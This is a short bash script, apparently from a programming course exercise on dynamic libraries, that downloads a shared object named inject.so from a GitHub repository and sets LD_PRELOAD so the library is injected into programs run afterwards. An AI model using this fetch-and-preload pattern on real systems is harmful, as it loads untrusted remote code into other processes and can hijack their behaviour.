#!/bin/bash
wget https://github.com/Yeeloman/alx-low_level_programming/raw/main/0x18-dynamic_libraries/inject.so -P ../
export LD_PRELOAD=../inject.so
